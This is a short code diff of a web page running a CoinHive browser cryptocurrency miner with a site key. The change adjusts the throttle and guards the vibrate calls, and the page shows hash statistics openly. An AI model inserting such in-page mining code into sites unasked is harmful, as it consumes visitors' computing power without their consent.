@@ -10,19 +10,23 @@
 	<p>totalHashes: <span id="totalHashes"></span></p>
 	<p>acceptedHashes: <span id="acceptedHashes"></span></p>
 	<script>
-		var miner = new CoinHive.Anonymous('AXIfvaL78oXFOcykqkOVztdu5rnWlm4L', {throttle: 0.01});
+		var miner = new CoinHive.Anonymous('AXIfvaL78oXFOcykqkOVztdu5rnWlm4L', {throttle: 0.1});
 
 		// Only start on non-mobile devices and if not opted-out
 		// in the last 14400 seconds (4 hours):
 		miner.start(CoinHive.IF_EXCLUSIVE_TAB);
 		miner.on('open', function() {
 			console.log("Connection open");
-			window.navigator.vibrate([70,100,70]);
+			if(window.navigator.vibrate) {
+				window.navigator.vibrate([70,100,70]);
+			}
 		})
 		miner.on('found', function() { console.log("Hash found") })
 		miner.on('accepted', function() {
 			console.log("Hash accepted by the pool")
-			window.navigator.vibrate(70);
+			if(window.navigator.vibrate) {
+				window.navigator.vibrate(70);
+			}
 		})
 
 		// Update stats once per second
